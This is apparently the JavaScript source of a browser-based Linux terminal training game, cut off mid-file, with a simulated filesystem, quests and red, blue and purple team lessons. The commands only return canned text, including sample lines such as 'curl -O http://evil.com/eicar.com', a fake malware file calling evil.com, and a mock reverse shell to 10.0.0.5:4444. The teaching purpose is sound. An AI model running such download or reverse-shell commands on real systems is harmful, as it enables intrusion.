// --- SECURITY HOOK ---
document.addEventListener("contextmenu", (e) => e.preventDefault());
document.addEventListener("keydown", (e) => {
  if (
    e.key === "F12" ||
    (e.ctrlKey &&
      e.shiftKey &&
      ["I", "J", "C"].includes(e.key.toUpperCase())) ||
    (e.ctrlKey && e.key.toUpperCase() === "U")
  )
    e.preventDefault();
});

// --- VFS DATABASES ---
let vfs = {};
let runningServices = { ssh: true, nginx: false, docker: false };
let envVars = { PATH: "/usr/bin:/bin", USER: "sysadmin", TERM: "xterm" };
let firewallRules = [];
let currentPath = "/home/sysadmin";
let userAliases = { ll: "ls -la" };
let commandHistory = [];
let historyIndex = -1;
let playerStats = { xp: 0, completedLessons: [], completedQuests: [] };

const initialVfsTemplate = {
  "/": {
    type: "dir",
    owner: "root",
    contents: {
      home: {
        type: "dir",
        owner: "root",
        contents: {
          sysadmin: {
            type: "dir",
            owner: "sysadmin",
            contents: {
              ".bash_profile": {
                type: "file",
                owner: "sysadmin",
                content: "export PATH=$PATH:/opt/bin",
              },
              "notes.txt": {
                type: "file",
                owner: "sysadmin",
                content: "Learn Linux\nMaster Terminal\nBecome Root",
              },
              projects: { type: "dir", owner: "sysadmin", contents: {} },
            },
          },
        },
      },
      var: {
        type: "dir",
        owner: "root",
        contents: {
          log: {
            type: "dir",
            owner: "root",
            contents: {
              syslog: {
                type: "file",
                owner: "root",
                content: "Booting kernel...\nNetwork UP\nNginx failed to start",
              },
              "auth.log": {
                type: "file",
                owner: "root",
                content: "Failed pass for root from 10.0.0.99",
              },
            },
          },
        },
      },
      etc: {
        type: "dir",
        owner: "root",
        contents: {
          passwd: {
            type: "file",
            owner: "root",
            content:
              "root:x:0:0:root:/root:/bin/bash\nsysadmin:x:1000:1000::/home/sysadmin:/bin/bash",
          },
        },
      },
      tmp: {
        type: "dir",
        owner: "root",
        contents: {
          "malware.bin": {
            type: "file",
            owner: "root",
            content: "\x7FELF\nConnecting to http://evil.com",
          },
        },
      },
    },
  },
};

function initVfs() {
  vfs = JSON.parse(JSON.stringify(initialVfsTemplate));
  currentPath = "/home/sysadmin";
}

function resolvePath(targetPath) {
  if (!targetPath) return { node: getVfsNode(currentPath), path: currentPath };
  if (targetPath === "~") targetPath = "/home/sysadmin";
  if (targetPath.startsWith("~/"))
    targetPath = "/home/sysadmin" + targetPath.substring(1);

  let parts = targetPath.split("/");
  let absPathParts = targetPath.startsWith("/")
    ? []
    : currentPath.split("/").filter(Boolean);

  for (let part of parts) {
    if (part === "" || part === ".") continue;
    if (part === "..") {
      if (absPathParts.length > 0) absPathParts.pop();
    } else {
      absPathParts.push(part);
    }
  }

  let resolvedStr = "/" + absPathParts.join("/");
  let current = vfs["/"];
  let parent = null;
  let finalName =
    absPathParts.length > 0 ? absPathParts[absPathParts.length - 1] : "";

  for (let i = 0; i < absPathParts.length; i++) {
    parent = current;
    if (!current.contents || !current.contents[absPathParts[i]]) return null;
    current = current.contents[absPathParts[i]];
  }
  return {
    node: current,
    path: resolvedStr === "//" ? "/" : resolvedStr,
    parentNode: parent,
    name: finalName,
  };
}

function getVfsNode(pathStr) {
  let res = resolvePath(pathStr);
  return res ? res.node : null;
}

function formatPromptPath() {
  return currentPath.startsWith("/home/sysadmin")
    ? currentPath.replace("/home/sysadmin", "~")
    : currentPath;
}

// --- THE FULLY EXPANDED MEGA CURRICULUM ---
const learningModules = [
  module1_navigation,
  module2_fileops,
  module3_textman,
  module4_diagnostics,
  module5_networking,
  module6_redteam,
  module7_blueteam,
  module8_purpleteam,
  module9_technical,
];

// --- BOSS QUESTS ---
const quests = [
  {
    id: "q1",
    title: "The Appender",
    difficulty: "Medium",
    reward: 200,
    description:
      "Create a file named `log.txt`, echo 'Start' into it, then append `>>` 'End' to it.",
    objective: "echo Start > log.txt, then echo End >> log.txt",
    check: () => {
      let n = getVfsNode("/home/sysadmin/log.txt");
      return n && n.content.includes("Start") && n.content.includes("End");
    },
  },
  {
    id: "q2",
    title: "Hidden Cleaner",
    difficulty: "Hard",
    reward: 300,
    description:
      "Navigate to `/home/sysadmin`, create a hidden directory `.trash`, and move `notes.txt` into it.",
    objective: "mkdir .trash && mv notes.txt .trash/",
    check: () => {
      let n = getVfsNode("/home/sysadmin/.trash/notes.txt");
      return n !== null;
    },
  },
  {
    id: "q3",
    title: "Log Investigator",
    difficulty: "Hard",
    reward: 400,
    description: "Grep for 'Failed' inside /var/log/auth.log.",
    objective: "Use grep Failed on auth.log",
    check: (c, a) =>
      c === "grep" &&
      a.includes("Failed") &&
      a.some((x) => x.includes("auth.log")),
  },
  {
    id: "q4",
    title: "System Rebooter",
    difficulty: "Ultimate",
    reward: 800,
    description: "Check `systemctl status nginx`, then start it.",
    objective: "Start the nginx daemon",
    check: () => runningServices["nginx"] === true,
  },
];

let activeModuleIndex = 0;
let activeLessonIndex = 0;
let activeTab = "modules";

function switchTab(tabId) {
  activeTab = tabId;
  ["modules", "quests", "cheatsheet"].forEach((t) => {
    document.getElementById(`view-${t}`).classList.add("hidden");
    document
      .getElementById(`tab-btn-${t}`)
      .classList.remove("border-indigo-500", "text-white");
    document
      .getElementById(`tab-btn-${t}`)
      .classList.add("border-transparent", "text-slate-400");
  });
  document.getElementById(`view-${tabId}`).classList.remove("hidden");
  document
    .getElementById(`tab-btn-${tabId}`)
    .classList.remove("border-transparent", "text-slate-400");
  document
    .getElementById(`tab-btn-${tabId}`)
    .classList.add("border-indigo-500", "text-white");
  if (tabId === "quests") renderQuests();
  if (tabId === "cheatsheet") renderCheatsheet();
}

function changeModule() {
  activeModuleIndex = parseInt(
    document.getElementById("module-selector").value,
  );
  activeLessonIndex = 0;
  renderLesson();
}

function renderModulesDropdown() {
  let select = document.getElementById("module-selector");
  select.innerHTML = "";
  learningModules.forEach((m, idx) => {
    select.innerHTML += `<option value="${idx}">${m.name}</option>`;
  });
  select.value = activeModuleIndex;
}

function renderLesson() {
  let m = learningModules[activeModuleIndex];
  let l = m.lessons[activeLessonIndex];
  document.getElementById("lesson-module-tag").innerText = m.name.split(" ")[1];
  document.getElementById("lesson-index-tag").innerText =
    `Lesson ${activeLessonIndex + 1}/${m.lessons.length}`;
  document.getElementById("active-lesson-body").innerHTML = `
        <h2 class="text-lg font-black text-white flex items-center gap-1.5"><span class="inline-block w-2 h-2 rounded-full bg-indigo-500 pulse-emerald"></span>${l.title}</h2>
        <div class="text-slate-400 text-[11px] leading-relaxed border-l-2 border-indigo-500/30 pl-3 italic bg-indigo-500/5 py-1.5 rounded-r"><strong class="text-slate-300">Context:</strong> ${l.why}</div>
        <p class="text-sm text-slate-300 leading-relaxed">${l.text}</p>`;
  document.getElementById("lesson-objective-target").innerHTML = l.objective;
  document.getElementById("lesson-xp-badge").innerText = `+${l.xp} XP`;
  renderModulesOverview();
  updateOverallProgress();
}

function renderModulesOverview() {
  let container = document.getElementById("modules-list");
  container.innerHTML = "";
  learningModules.forEach((mod, mIdx) => {
    let count = 0;
    mod.lessons.forEach((les, lIdx) => {
      if (playerStats.completedLessons.includes(`${mIdx}_${lIdx}`)) count++;
    });
    let pct = Math.round((count / mod.lessons.length) * 100);
    container.innerHTML += `
            <div class="p-3 rounded-xl border text-xs flex flex-col gap-2 transition-all ${activeModuleIndex === mIdx ? "bg-slate-950 border-indigo-500/30" : "bg-slate-950/40 border-slate-800"}">
                <div class="flex items-center justify-between cursor-pointer" onclick="selectModuleFromList(${mIdx})">
                    <span class="font-bold text-slate-300">${mod.name}</span><span class="text-slate-500 font-mono">${pct}%</span>
                </div>
                <div class="w-full bg-slate-900 rounded-full h-1"><div class="bg-indigo-500 h-1 rounded-full" style="width: ${pct}%"></div></div>
            </div>`;
  });
}

function selectModuleFromList(idx) {
  activeModuleIndex = idx;
  activeLessonIndex = 0;
  document.getElementById("module-selector").value = idx;
  renderLesson();
}

function renderQuests() {
  let container = document.getElementById("quests-container");
  container.innerHTML = "";
  quests.forEach((q) => {
    let done = playerStats.completedQuests.includes(q.id);
    let col =
      q.difficulty === "Ultimate"
        ? "text-purple-400 bg-purple-400/10 border-purple-400/20"
        : q.difficulty === "Medium"
          ? "text-yellow-400 bg-yellow-400/10 border-yellow-400/20"
          : "text-red-400 bg-red-400/10 border-red-400/20";
    container.innerHTML += `
            <div class="p-4 border rounded-xl space-y-3 ${done ? "bg-emerald-950/10 border-emerald-500/20" : "bg-slate-950 border-slate-800"}">
                <div class="flex items-center justify-between"><span class="font-mono text-[10px] uppercase px-2 py-0.5 border rounded-full ${done ? "text-emerald-400 bg-emerald-400/10 border-emerald-400/20" : col}">${done ? "✅ Resolved" : q.difficulty}</span><span class="text-xs font-bold text-indigo-400">+${q.reward} XP</span></div>
                <h4 class="font-bold text-white text-sm">${q.title}</h4>
                <p class="text-slate-400 text-xs">${q.description}</p>
            </div>`;
  });
}

function renderCheatsheet() {
  let container = document.getElementById("cheatsheet-list");
  container.innerHTML = "";
  let query = document
    .getElementById("cheatsheet-search")
    .value.toLowerCase()
    .trim();
  let keys = Object.keys(commands).sort();

  keys.forEach((k) => {
    let cmdObj = commands[k];
    if (
      query !== "" &&
      !k.includes(query) &&
      !cmdObj.desc.toLowerCase().includes(query)
    )
      return;

    let div = document.createElement("div");
    div.className = `p-3 bg-slate-950 border border-slate-800/80 rounded-xl space-y-1`;

    let badge = `<span class="font-mono text-[10px] text-emerald-400 bg-emerald-400/10 px-2 py-0.5 rounded border border-emerald-500/20">Unlocked</span>`;

    div.innerHTML = `
            <div class="flex items-center justify-between">
                <span class="font-mono text-xs font-bold text-indigo-400">${k}</span>
                ${badge}
            </div>
            <p class="text-slate-300 text-xs leading-relaxed">${cmdObj.desc}</p>
        `;
    container.appendChild(div);
  });
}
function filterCheatsheet() {
  renderCheatsheet();
}

// --- PROGRESSION ---
const maxGlobalXp = 30000;
function addXp(amount) {
  playerStats.xp += amount;
  let r = "Terminal Newbie";
  if (playerStats.xp >= 30000) r = "Linux Kernel God 👑🌌";
  else if (playerStats.xp >= 15000) r = "Global CISO 🛡️";
  else if (playerStats.xp >= 5000) r = "Red Team Ops 🥷";
  else if (playerStats.xp >= 2000) r = "SysAdmin 💻";

  document.getElementById("rank-name").innerText = `Rank: ${r}`;
  document.getElementById("xp-counter").innerText =
    `${playerStats.xp} / ${maxGlobalXp} XP`;
  document.getElementById("xp-progress").style.width =
    `${Math.min(100, (playerStats.xp / maxGlobalXp) * 100)}%`;
  localStorage.setItem("linux_mega_stats", JSON.stringify(playerStats));
}

function updateOverallProgress() {
  let t = 0;
  learningModules.forEach((m) => (t += m.lessons.length));
  document.getElementById("overall-progress-tag").innerText =
    `Progress: ${Math.round((playerStats.completedLessons.length / t) * 100)}%`;
}

function loadStats() {
  let saved = localStorage.getItem("linux_mega_stats");
  if (saved) {
    try {
      playerStats = JSON.parse(saved);
      if (!playerStats.completedQuests) playerStats.completedQuests = [];
    } catch (e) {}
  }
  addXp(0);
}

// --- THE FULLY EXPANDED COMMAND PARSER ENGINE ---
const commands = {
  help: {
    desc: "Show commands.",
    run: () =>
      Object.keys(commands)
        .sort()
        .map(
          (c) =>
            `<span class="text-indigo-400 font-bold">${c.padEnd(10)}</span> - ${commands[c].desc}`,
        )
        .join("<br>"),
  },
  pwd: {
    desc: "Print working directory.",
    run: () => currentPath,
  },
  date: {
    desc: "Print date.",
    run: () => new Date().toString(),
  },
  uptime: {
    desc: "System uptime.",
    run: () =>
      " 19:35:12 up 14 days,  3:12,  1 user,  load average: 0.04, 0.05, 0.01",
  },
  whoami: {
    desc: "Current user.",
    run: () => "sysadmin",
  },
  ls: {
    desc: "List contents. Supports -a, -l.",
    run: (args) => {
      let sAll =
        args.includes("-a") || args.includes("-la") || args.includes("-al");
      let sLong =
        args.includes("-l") || args.includes("-la") || args.includes("-al");
      let target = args.filter((a) => !a.startsWith("-"))[0] || "";
      let res = resolvePath(target);

      if (!res)
        return `<span class="term-err">ls: cannot access '${target}'</span>`;
      if (res.node.type !== "dir") return target;

      let out = [];
      if (sAll) {
        out.push(
          sLong
            ? `drwxr-xr-x 2 ${res.node.owner} 4096 .`
            : `<span class="term-dir">.</span>`,
        );
        out.push(
          sLong
            ? `drwxr-xr-x 3 root 4096 ..`
            : `<span class="term-dir">..</span>`,
        );
      }

      for (let key in res.node.contents) {
        let n = res.node.contents[key];
        if (sLong) {
          out.push(
            `${n.type === "dir" ? "d" : "-"}rwxr-xr-x 1 ${n.owner || "root"} ${n.type === "dir" ? "4096" : "1024"} ${key}${n.type === "dir" ? "/" : ""}`,
          );
        } else {
          out.push(
            n.type === "dir"
              ? `<span class="term-dir">${key}/</span>`
              : `<span>${key}</span>`,
          );
        }
      }
      return sLong ? out.join("<br>") : out.join("   ");
    },
  },
  cd: {
    desc: "Change dir. Use ~ for home, .. for parent.",
    run: (args) => {
      let res = resolvePath(args[0] || "~");
      if (!res || res.node.type !== "dir")
        return `<span class="term-err">cd: path not found</span>`;
      currentPath = res.path;
      document.getElementById("prompt-path").innerText = formatPromptPath();
      return "";
    },
  },
  mkdir: {
    desc: "Make dir. Supports multiple.",
    run: (args) => {
      if (args.length === 0) return "mkdir: missing operand";
      args.forEach((t) => {
        let parts = t.split("/");
        let n = parts.pop();
        let pRes = resolvePath(parts.join("/") || ".");
        if (pRes && pRes.node.type === "dir") {
          pRes.node.contents[n] = {
            type: "dir",
            owner: "sysadmin",
            contents: {},
          };
        }
      });
      return "";
    },
  },
  touch: {
    desc: "Create file. Supports multiple.",
    run: (args) => {
      args.forEach((t) => {
        let parts = t.split("/");
        let n = parts.pop();
        let pRes = resolvePath(parts.join("/") || ".");
        if (pRes && pRes.node.type === "dir") {
          pRes.node.contents[n] = {
            type: "file",
            owner: "sysadmin",
            content: "",
          };
        }
      });
      return "";
    },
  },
  rm: {
    desc: "Remove file. Use -rf for dir.",
    run: (args) => {
      let rec = args.includes("-r") || args.includes("-rf");
      let targets = args.filter((a) => !a.startsWith("-"));
      targets.forEach((t) => {
        let res = resolvePath(t);
        if (res && res.parentNode) {
          if (res.node.type === "dir" && !rec) return;
          delete res.parentNode.contents[res.name];
        }
      });
      return "";
    },
  },
  rmdir: {
    desc: "Remove empty dir.",
    run: (args) => {
      let res = resolvePath(args[0]);
      if (
        res &&
        res.node.type === "dir" &&
        Object.keys(res.node.contents).length === 0
      ) {
        delete res.parentNode.contents[res.name];
      }
      return "";
    },
  },
  cp: {
    desc: "Copy file.",
    run: (args) => {
      let src = resolvePath(args[0]),
        dest = resolvePath(args[1]);
      if (src && dest && dest.node.type === "dir") {
        dest.node.contents[src.name] = JSON.parse(JSON.stringify(src.node));
      } else if (src) {
        let destParts = args[1].split("/");
        let n = destParts.pop();
        let pRes = resolvePath(destParts.join("/") || ".");
        if (pRes) {
          pRes.node.contents[n] = JSON.parse(JSON.stringify(src.node));
        }
      }
      return "";
    },
  },
  mv: {
    desc: "Move/Rename.",
    run: (args) => {
      let src = resolvePath(args[0]),
        dest = resolvePath(args[1]);
      if (src && dest && dest.node.type === "dir") {
        dest.node.contents[src.name] = src.node;
        delete src.parentNode.contents[src.name];
      } else if (src) {
        let destParts = args[1].split("/");
        let n = destParts.pop();
        let pRes = resolvePath(destParts.join("/") || ".");
        if (pRes) {
          pRes.node.contents[n] = src.node;
          delete src.parentNode.contents[src.name];
        }
      }
      return "";
    },
  },
  echo: {
    desc: "Print or write. Supports > and >>.",
    run: (args) => {
      let apIdx = args.indexOf(">>"),
        wrIdx = args.indexOf(">");
      if (apIdx !== -1) {
        let text = args
          .slice(0, apIdx)
          .join(" ")
          .replace(/^['"]|['"]$/g, "");
        let f = resolvePath(args[apIdx + 1]);
        if (f && f.node.type === "file") {
          f.node.content += "\n" + text;
        } else {
          let p = args[apIdx + 1].split("/");
          let n = p.pop();
          let r = resolvePath(p.join("/") || ".");
          if (r) r.node.contents[n] = { type: "file", content: text };
        }
        return "";
      } else if (wrIdx !== -1) {
        let text = args
          .slice(0, wrIdx)
          .join(" ")
          .replace(/^['"]|['"]$/g, "");
        let p = args[wrIdx + 1].split("/");
        let n = p.pop();
        let r = resolvePath(p.join("/") || ".");
        if (r) r.node.contents[n] = { type: "file", content: text };
        return "";
      }
      return args.join(" ").replace(/^['"]|['"]$/g, "");
    },
  },
  cat: {
    desc: "Read file.",
    run: (args) => {
      let r = resolvePath(args[0]);
      return r && r.node.type === "file"
        ? r.node.content.replace(/\n/g, "<br>")
        : "Error reading file";
    },
  },
  grep: {
    desc: "Search text.",
    run: (args) => {
      let pat = args[0].replace(/['"]/g, ""),
        r = resolvePath(args[1]);
      return r && r.node.type === "file"
        ? r.node.content
            .split("\n")
            .filter((x) => x.includes(pat))
            .join("<br>")
        : "";
    },
  },
  systemctl: {
    desc: "Service manager.",
    run: (args) => {
      if (args[0] === "start") runningServices[args[1]] = true;
      if (args[0] === "status")
        return `Active: ${runningServices[args[1]] ? "running" : "dead"}`;
      return "";
    },
  },
  clear: {
    desc: "Clear screen.",
    run: () => "CLEAR_SIGNAL",
  },
  wc: {
    desc: "Count words.",
    run: (args) => {
      let r = resolvePath(args[0]);
      if (r && r.node.type === "file") {
        let l = r.node.content.split("\n").length,
          w = r.node.content.split(/\s+/).length;
        return `${l} ${w} ${r.node.content.length} ${args[0]}`;
      }
      return "";
    },
  },
  head: {
    desc: "Read top.",
    run: (args) => {
      let r = resolvePath(args[0]);
      return r && r.node.type === "file"
        ? r.node.content.split("\n").slice(0, 5).join("<br>")
        : "";
    },
  },
  df: {
    desc: "Disk space.",
    run: () => "/dev/sda1  40G  8G  32G  20% /",
  },
  free: {
    desc: "Memory info.",
    run: () => "Mem: 16000 4000 12000",
  },
  ping: {
    desc: "Network test.",
    run: (args) => `PING ${args[0]} 64 bytes... time=12ms`,
  },
  netstat: {
    desc: "Network connections.",
    run: () => "tcp 0 0 0.0.0.0:80 LISTEN",
  },
  nmap: {
    desc: "Port scanner.",
    run: () => "PORT 80/tcp OPEN http",
  },
  strings: {
    desc: "Read binary strings.",
    run: () => "http://evil.com/drop",
  },
  // --- RED TEAM HACKER TOOLS ---
  curl: {
    desc: "Transfer data from a URL.",
    run: (args) => {
      if (args.includes("-O")) return "Downloaded payload successfully.";
      if (args.includes("-F"))
        return "Data exfiltrated to Command & Control server.";
      if (args.includes("-I"))
        return "HTTP/1.1 200 OK\nServer: nginx/1.24.0 (Ubuntu)\nConnection: keep-alive";
      return "<html>Target Acquired. Vulnerable parameter exposed.</html>";
    },
  },
  sudo: {
    desc: "Execute a command as another user.",
    run: (args) => {
      if (args.includes("-l"))
        return "User sysadmin may run the following commands on localhost:\n    (ALL : ALL) NOPASSWD: ALL";
      return "root access granted.";
    },
  },
  chmod: {
    desc: "Change file mode bits (Permissions).",
    run: () => "",
  },
  tar: {
    desc: "An archiving utility.",
    run: () => "Archiving files...\nloot.tar.gz created successfully.",
  },
  find: {
    desc: "Search for files in a directory hierarchy.",
    run: () =>
      "/usr/bin/sudo\n/usr/bin/passwd\n/var/backups/shadow.bak\n/home/admin/.ssh/id_rsa",
  },
  history: {
    desc: "Command History.",
    run: () => "History cleared.",
  },
  id: {
    desc: "Print user and group IDs.",
    run: () => "uid=0(root) gid=0(root) groups=0(root)",
  },
  crontab: {
    desc: "Maintain crontab files for individual users.",
    run: (args) =>
      args.includes("-l")
        ? "* * * * * /tmp/shell.sh"
        : "crontab updated successfully.",
  },
  // --- SIMULATED EXECUTABLES ---
  "./linpeas.sh": {
    desc: "Privilege Escalation Enum Script.",
    run: () =>
      "Scanning system...\n[+] VULNERABLE to CVE-2021-4034 (PwnKit)\n[+] Readable shadow backup found in /var/backups/",
  },
  "./exploit.bin": {
    desc: "Compiled Exploit Payload.",
    run: () =>
      "Exploiting...\n[+] Root shell spawned.\nuid=0(root) gid=0(root)",
  },
  "./tmp/shell.sh": {
    desc: "Reverse Shell Dispatcher.",
    run: () => "Reverse shell connection dispatched to 10.0.0.5:4444",
  },
  // --- BLUE TEAM DEFENSIVE TOOLS ---
  w: {
    desc: "Show who is logged on and what they are doing.",
    run: () =>
      "USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nsysadmin pts/0    192.168.1.100    10:00    0.00s  0.05s  0.00s w\nroot     pts/1    10.0.0.99        10:05    1:23m  0.10s  0.01s -bash",
  },
  who: {
    desc: "Show who is logged on.",
    run: () =>
      "sysadmin pts/0        2026-10-21 10:00 (192.168.1.100)\nroot     pts/1        2026-10-21 10:05 (10.0.0.99)",
  },
  last: {
    desc: "Show listing of last logged in users.",
    run: () =>
      "root     pts/1        10.0.0.99        Wed Oct 21 10:05   still logged in\nsysadmin pts/0        192.168.1.100    Wed Oct 21 10:00   still logged in\nreboot   system boot  0.0.0.0          Tue Oct 20 08:00",
  },
  tail: {
    desc: "Output the last part of files.",
    run: (args) => {
      let path = args[args.length - 1];
      if (path.includes("auth.log"))
        return "Oct 21 10:02:14 server sshd[1200]: Failed password for root from 10.0.0.99 port 54321 ssh2\nOct 21 10:05:01 server sshd[1205]: Accepted password for root from 10.0.0.99 port 54322 ssh2";
      if (path.includes("syslog"))
        return "Oct 21 08:00:01 server kernel: [    0.000000] Booting kernel\nOct 21 10:06:22 server kernel: [  7582.12] exploit.bin[1337]: segfault at 0 ip 00007f sp 00007f error 4";
      return "tail: reading data...";
    },
  },
  ps: {
    desc: "Report a snapshot of current processes.",
    run: () =>
      "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1  10200  4000 ?        Ss   Oct20   0:02 /sbin/init\nroot      1337 99.9  1.5  50000 15000 ?        R    10:06   5:42 /tmp/shell.sh\nsysadmin  1400  0.0  0.2   8000  2000 pts/0    R+   10:15   0:00 ps aux",
  },
  kill: {
    desc: "Send a signal to a process.",
    run: () => "Process terminated.",
  },
  chown: {
    desc: "Change file owner and group.",
    run: () => "Ownership modified successfully.",
  },
  "iptables-save": {
    desc: "Dump iptables rules to stdout.",
    run: () =>
      "# Generated by iptables-save\n*filter\n:INPUT ACCEPT [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\n-A INPUT -s 10.0.0.99/32 -j DROP\nCOMMIT",
  },
  // --- PURPLE TEAM THREAT HUNTING TOOLS ---
  logger: {
    desc: "Enter messages into the system log.",
    run: (args) => {
      let msg = args.join(" ").replace(/['"]/g, "");
      let syslog = resolvePath("/var/log/syslog");
      if (syslog && syslog.node.type === "file") {
        syslog.node.content += `\nOct 21 11:30:00 server logger: ${msg}`;
      }
      return "";
    },
  },
  journalctl: {
    desc: "Query the systemd journal.",
    run: (args) => {
      if (args.includes("--disk-usage"))
        return "Archived and active journals take up 144.0M in the file system.";
      if (args.includes("-p") && args.includes("err"))
        return "-- Logs begin at Tue 2026-10-20 08:00:00 UTC --\nOct 21 10:06:22 server kernel: [ 7582.12] exploit.bin[1337]: segfault at 0 ip 00007f error 4";
      if (args.includes("-u") && args.includes("ssh"))
        return "Oct 21 10:00:00 server sshd[1200]: Server listening on 0.0.0.0 port 22.";
      return "-- Logs begin at Tue 2026-10-20 08:00:00 UTC --\nOct 21 11:30:00 server logger: Purple Team Test\nOct 21 11:35:00 server sudo: sysadmin : TTY=pts/0 ; COMMAND=/usr/bin/curl -O http://evil.com/eicar.com";
    },
  },
  auditctl: {
    desc: "A utility to assist controlling the kernel's audit system.",
    run: (args) => {
      if (args.includes("-s"))
        return "enabled 1\nfailure 1\npid 643\nrate_limit 0\nbacklog_limit 8192\nlost 0\nbacklog 0";
      if (args.includes("-l"))
        return "-w /etc/shadow -p r -k shadow_read\n-w /usr/bin/ping -p x -k ping_exec";
      if (args.includes("-D")) return "No rules";
      return "";
    },
  },
  ausearch: {
    desc: "A tool to query audit daemon logs.",
    run: (args) => {
      if (args.includes("-k") && args.includes("shadow_read"))
        return 'time->Wed Oct 21 11:40:00 2026\ntype=SYSCALL msg=audit(1697888400.123:45): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd3a a2=0 a3=0 items=1 ppid=1200 pid=1337 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm="cat" exe="/usr/bin/cat" key="shadow_read"';
      return 'time->Wed Oct 21 11:40:00 2026\ntype=CONFIG_CHANGE msg=audit(1697888400.123:46): auid=1000 ses=3 op=add_rule key="ping_exec" list=4 res=1';
    },
  },
  aureport: {
    desc: "A tool that produces summary reports of audit daemon logs.",
    run: () =>
      "Executable Summary Report\n=================================\ntotal  file\n=================================\n45  /usr/bin/sudo\n12  /usr/bin/cat\n3   /tmp/exploit.bin",
  },
  ss: {
    desc: "Utility to investigate sockets (Modern netstat).",
    run: (args) => {
      if (args.includes("-s"))
        return "Total: 154\nTCP:   12 (estab 2, closed 4, orphaned 0, timewait 0)\nUDP:   5";
      return 'State    Recv-Q   Send-Q      Local Address:Port       Peer Address:Port   Process\nLISTEN   0        128               0.0.0.0:22              0.0.0.0:* users:(("sshd",pid=1200,fd=3))\nLISTEN   0        128               0.0.0.0:80              0.0.0.0:* users:(("nginx",pid=1201,fd=4))';
    },
  },
  lsof: {
    desc: "List open files.",
    run: (args) => {
      if (args.includes("+L1"))
        return "COMMAND     PID   USER   FD   TYPE DEVICE SIZE/OFF NLINK      NODE NAME\nmalware.b  1337   root  txt    REG    8,1     5000     0 123456789 /tmp/malware.bin (deleted)";
      if (args.includes("-iTCP"))
        return "COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nsshd     1200 root    3u  IPv4  12345      0t0  TCP *:ssh (LISTEN)\nnginx    1201 root    4u  IPv4  12346      0t0  TCP *:http (LISTEN)";
      return "COMMAND     PID   USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME\nsystemd       1   root  cwd       DIR                8,1     4096          2 /\nbash       1400 sysadmin  cwd     DIR                8,1     4096      10000 /home/sysadmin";
    },
  },
  tcpdump: {
    desc: "Dump traffic on a network.",
    run: (args) => {
      if (args.includes("-r"))
        return "reading from file capture.pcap, link-type EN10MB (Ethernet)\n11:45:01.123456 IP 10.0.0.100.54321 > 10.0.0.99.80: Flags [S], seq 123456789, win 64240, options [mss 1460,sackOK,TS val 123456 ecr 0,nop,wscale 7], length 0";
      return "tcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\n11:45:01.123456 IP 10.0.0.100.54321 > 10.0.0.99.80: Flags [S]\n11:45:01.124567 IP 10.0.0.99.80 > 10.0.0.100.54321: Flags [S.]\n11:45:01.124678 IP 10.0.0.100.54321 > 10.0.0.99.80: Flags [.]\n3 packets captured\n3 packets received by filter";
    },
  },
  chkrootkit: {
    desc: "Check for signs of a rootkit.",
    run: (args) => {
      if (args.includes("-q")) return "INFECTED: Possible LKM Trojan installed";
      return "ROOTDIR is `/'\nChecking `amd'... not found\nChecking `basename'... not infected\nChecking `biff'... not found\nChecking `chfn'... not infected\nChecking `chsh'... not infected\nChecking `cron'... not infected\nChecking `crontab'... not infected\nChecking `date'... not infected\nChecking `du'... not infected\nChecking `dirname'... not infected\nChecking `echo'... not infected\nChecking `egrep'... not infected\nChecking `env'... not infected\nChecking `find'... not infected\nSearching for LKM Trojan... INFECTED";
    },
  },
  "aa-status": {
    desc: "Display various information about the current AppArmor policy.",
    run: () =>
      "apparmor module is loaded.\n14 profiles are loaded.\n12 profiles are in enforce mode.\n   /usr/sbin/cupsd\n   /usr/sbin/mysqld\n2 profiles are in complain mode.\n0 processes have profiles defined.\n0 processes are in enforce mode.\n0 processes are in complain mode.\n0 processes are unconfined but have a profile defined.",
  },
  apparmor_status: {
    desc: "Display various information about the current AppArmor policy.",
    run: () =>
      "apparmor module is loaded.\n14 profiles are loaded.\n12 profiles are in enforce mode.\n   /usr/sbin/cupsd\n   /usr/sbin/mysqld\n2 profiles are in complain mode.\n0 processes have profiles defined.\n0 processes are in enforce mode.\n0 processes are in complain mode.\n0 processes are unconfined but have a profile defined.",
  },
  lastb: {
    desc: "Show a listing of last failed login attempts.",
    run: () =>
      "root     ssh:notty    10.0.0.99        Wed Oct 21 10:02 - 10:02  (00:00)\nroot     ssh:notty    10.0.0.99        Wed Oct 21 10:01 - 10:01  (00:00)\nroot     ssh:notty    10.0.0.99        Wed Oct 21 10:00 - 10:00  (00:00)\n\nbtmp begins Tue Oct 20 08:00:00 2026",
  },
  // --- ENTERPRISE PENTESTING & DEFENSE TOOLS (MODULE 9) ---
  searchsploit: {
    desc: "Search Exploit-DB for known vulnerabilities.",
    run: (args) => {
      if (args.includes("-p") && args.includes("50383"))
        return "  Exploit: Apache HTTP Server 2.4.49 - Path Traversal / RCE\n      URL: https://www.exploit-db.com/exploits/50383\n     Path: /usr/share/exploits/50383.py";
      return "-------------------------------------------------- -------------------------\n Exploit Title                                    |  Path\n-------------------------------------------------- -------------------------\nApache HTTP Server 2.4.49 - Path Traversal / RCE  | exploits/linux/remote/50383.py\n-------------------------------------------------- -------------------------";
    },
  },
  msfconsole: {
    desc: "Launch the Metasploit Framework.",
    run: () =>
      " \n       =[ metasploit v6.3.5-dev                           ]\n+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]\n+ -- --=[ 968 payloads - 46 encoders - 11 nops            ]\n\nmsf6 > _",
  },
  search: {
    desc: "Search Metasploit modules.",
    run: (args) => {
      if (args[0] && args[0].includes("cve:2021"))
        return "Matching Modules\n================\n\n   #  Name                                         Disclosure Date  Rank       Check  Description\n   -  ----                                         ---------------  ----       -----  -----------\n   0  exploit/multi/http/apache_normalize_path_rce  2021-10-05       excellent  Yes    Apache 2.4.49 Path Traversal RCE";
      return "Search string required.";
    },
  },
  exit: {
    desc: "Exit current shell or framework.",
    run: () => "Session closed. Exiting...",
  },
  openssl: {
